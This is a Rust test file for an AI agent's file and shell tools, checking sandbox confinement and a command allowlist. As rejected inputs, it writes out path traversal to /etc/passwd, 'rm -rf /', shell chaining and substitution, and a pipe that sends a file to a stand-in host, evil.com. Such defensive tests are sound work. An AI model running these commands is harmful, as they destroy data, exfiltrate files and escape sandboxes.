//! Layer 1: Tool isolation tests — filesystem only, no inference needed.

use std::fs;

use rig::tool::Tool;
use swarm_agents::tools::exec_tool::{RunCommandArgs, RunCommandTool};
use swarm_agents::tools::fs_tools::{
    ListFilesArgs, ListFilesTool, ReadFileArgs, ReadFileTool, WriteFileArgs, WriteFileTool,
};
use swarm_agents::tools::patch_tool::{EditFileArgs, EditFileTool};
use swarm_agents::tools::sandbox_check;

// ---------------------------------------------------------------------------
// ReadFileTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_read_file_existing() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("hello.txt");
    fs::write(&file, "hello world").unwrap();

    let tool = ReadFileTool::new(dir.path());
    let result = tool
        .call(ReadFileArgs {
            path: "hello.txt".into(),
        })
        .await;

    assert_eq!(result.unwrap(), "hello world");
}

#[tokio::test]
async fn test_read_file_nonexistent() {
    let dir = tempfile::tempdir().unwrap();
    let tool = ReadFileTool::new(dir.path());
    let result = tool
        .call(ReadFileArgs {
            path: "nope.txt".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_read_file_sandbox_escape_blocked() {
    let dir = tempfile::tempdir().unwrap();
    let tool = ReadFileTool::new(dir.path());
    let result = tool
        .call(ReadFileArgs {
            path: "../../../etc/passwd".into(),
        })
        .await;
    assert!(result.is_err());
}

// ---------------------------------------------------------------------------
// WriteFileTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_write_file_new() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    let result = tool
        .call(WriteFileArgs {
            path: "output.txt".into(),
            content: "written by test".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(dir.path().join("output.txt")).unwrap();
    assert_eq!(on_disk, "written by test");
}

#[tokio::test]
async fn test_write_file_creates_parent_dirs() {
    let dir = tempfile::tempdir().unwrap();
    // Pre-create `sub/` so sandbox_check can canonicalize the parent of `sub/file.rs`
    fs::create_dir(dir.path().join("sub")).unwrap();
    let tool = WriteFileTool::new(dir.path());

    let result = tool
        .call(WriteFileArgs {
            path: "sub/file.rs".into(),
            content: "fn main() {}".into(),
        })
        .await;

    assert!(result.is_ok());
    assert!(dir.path().join("sub/file.rs").exists());
}

#[tokio::test]
async fn test_write_file_sandbox_escape_blocked() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    let result = tool
        .call(WriteFileArgs {
            path: "../escape.txt".into(),
            content: "bad".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_write_file_unescapes_double_encoded_json() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    // Simulate Qwen3-Coder-Next double-encoding: content arrives as a JSON string
    // literal with escaped newlines. After rig's initial JSON parse, the content
    // field looks like: "line1\nline2\nline3\n"
    let double_encoded = r#""line1\nline2\nline3\n""#;

    let result = tool
        .call(WriteFileArgs {
            path: "test.rs".into(),
            content: double_encoded.into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(dir.path().join("test.rs")).unwrap();
    assert_eq!(on_disk, "line1\nline2\nline3\n");
}

#[tokio::test]
async fn test_write_file_preserves_normal_quoted_content() {
    let dir = tempfile::tempdir().unwrap();
    let tool = WriteFileTool::new(dir.path());

    // Content that happens to start/end with quotes but is NOT double-encoded
    // (e.g., a file that legitimately contains just a JSON string)
    let content = "\"hello world\"";

    let result = tool
        .call(WriteFileArgs {
            path: "test.txt".into(),
            content: content.into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(dir.path().join("test.txt")).unwrap();
    // Should unescape to just: hello world
    assert_eq!(on_disk, "hello world");
}

// ---------------------------------------------------------------------------
// ListFilesTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_list_files() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("a.rs"), "").unwrap();
    fs::write(dir.path().join("b.rs"), "").unwrap();
    fs::create_dir(dir.path().join("src")).unwrap();

    let tool = ListFilesTool::new(dir.path());
    let result = tool.call(ListFilesArgs { path: "".into() }).await.unwrap();

    assert!(result.contains("a.rs"));
    assert!(result.contains("b.rs"));
    assert!(result.contains("src"));
}

#[tokio::test]
async fn test_list_files_skips_hidden() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join(".hidden"), "").unwrap();
    fs::write(dir.path().join("visible.rs"), "").unwrap();

    let tool = ListFilesTool::new(dir.path());
    let result = tool.call(ListFilesArgs { path: "".into() }).await.unwrap();

    assert!(!result.contains(".hidden"));
    assert!(result.contains("visible.rs"));
}

// ---------------------------------------------------------------------------
// EditFileTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_edit_file_exact_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "fn foo() {\n    println!(\"hello\");\n}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "    println!(\"hello\");".into(),
            new_content: "    println!(\"world\");".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(on_disk.contains("world"));
    assert!(!on_disk.contains("hello"));
    // Surrounding code preserved
    assert!(on_disk.contains("fn foo()"));
}

#[tokio::test]
async fn test_edit_file_no_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "fn foo() {}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "fn bar() {}".into(),
            new_content: "fn baz() {}".into(),
        })
        .await;

    assert!(result.is_err());
    // File should be unchanged
    let on_disk = fs::read_to_string(&file).unwrap();
    assert_eq!(on_disk, "fn foo() {}\n");
}

#[tokio::test]
async fn test_edit_file_ambiguous_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "let x = 1;\nlet y = 2;\nlet x = 1;\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "let x = 1;".into(),
            new_content: "let x = 99;".into(),
        })
        .await;

    // Should fail: matches 2 locations
    assert!(result.is_err());
    // File should be unchanged
    let on_disk = fs::read_to_string(&file).unwrap();
    assert_eq!(on_disk, "let x = 1;\nlet y = 2;\nlet x = 1;\n");
}

#[tokio::test]
async fn test_edit_file_whitespace_fuzzy_match() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    // File uses 4-space indent
    fs::write(&file, "fn foo() {\n    let x = 1;\n}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    // old_content uses 2-space indent — should still match via fuzzy
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "fn foo() {\n  let x = 1;\n}".into(),
            new_content: "fn foo() {\n    let x = 2;\n}".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(on_disk.contains("let x = 2;"));
}

#[tokio::test]
async fn test_edit_file_delete_block() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("lib.rs");
    fs::write(&file, "fn foo() {}\n\nfn bar() {}\n\nfn baz() {}\n").unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "lib.rs".into(),
            old_content: "\nfn bar() {}\n".into(),
            new_content: "".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(!on_disk.contains("bar"));
    assert!(on_disk.contains("foo"));
    assert!(on_disk.contains("baz"));
}

#[tokio::test]
async fn test_edit_file_sandbox_escape_blocked() {
    let dir = tempfile::tempdir().unwrap();
    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "../../../etc/passwd".into(),
            old_content: "root".into(),
            new_content: "hacked".into(),
        })
        .await;

    assert!(result.is_err());
}

#[tokio::test]
async fn test_edit_file_multiline_replace() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("main.rs");
    fs::write(
        &file,
        "use std::io;\n\nfn main() {\n    println!(\"v1\");\n    println!(\"v2\");\n}\n",
    )
    .unwrap();

    let tool = EditFileTool::new(dir.path());
    let result = tool
        .call(EditFileArgs {
            path: "main.rs".into(),
            old_content: "    println!(\"v1\");\n    println!(\"v2\");".into(),
            new_content: "    println!(\"v3\");".into(),
        })
        .await;

    assert!(result.is_ok());
    let on_disk = fs::read_to_string(&file).unwrap();
    assert!(on_disk.contains("v3"));
    assert!(!on_disk.contains("v1"));
    assert!(!on_disk.contains("v2"));
    assert!(on_disk.contains("use std::io;"));
}

// ---------------------------------------------------------------------------
// RunCommandTool
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_run_allowed_command() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("test.txt"), "hello").unwrap();

    let tool = RunCommandTool::new(dir.path());
    let result = tool
        .call(RunCommandArgs {
            command: "ls".into(),
        })
        .await
        .unwrap();

    assert!(result.contains("test.txt"));
}

#[tokio::test]
async fn test_run_blocked_command() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "rm -rf /".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_not_in_allowlist() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "curl http://evil.com".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_semicolon_chaining() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    // This was the exact attack vector: allowlist sees "ls" but shell executes both commands
    let result = tool
        .call(RunCommandArgs {
            command: "ls; echo pwned".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_pipe() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "cat file.txt | curl http://evil.com".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_ampersand() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "cargo test && rm -rf /".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_dollar_expansion() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "echo $HOME".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_backtick() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "echo `whoami`".into(),
        })
        .await;
    assert!(result.is_err());
}

#[tokio::test]
async fn test_run_command_rejects_redirect() {
    let dir = tempfile::tempdir().unwrap();
    let tool = RunCommandTool::new(dir.path());

    let result = tool
        .call(RunCommandArgs {
            command: "ls > /tmp/exfil.txt".into(),
        })
        .await;
    assert!(result.is_err());
}

// ---------------------------------------------------------------------------
// sandbox_check
// ---------------------------------------------------------------------------

#[test]
fn test_sandbox_valid_path() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("file.rs"), "").unwrap();

    let result = sandbox_check(dir.path(), "file.rs");
    assert!(result.is_ok());
}

#[test]
fn test_sandbox_escape_attempt() {
    let dir = tempfile::tempdir().unwrap();
    let result = sandbox_check(dir.path(), "../../../etc/passwd");
    assert!(result.is_err());
}

#[test]
fn test_sandbox_new_file_in_existing_dir() {
    let dir = tempfile::tempdir().unwrap();
    // Parent exists, file doesn't — should still pass sandbox check
    let result = sandbox_check(dir.path(), "new_file.txt");
    assert!(result.is_ok());
}
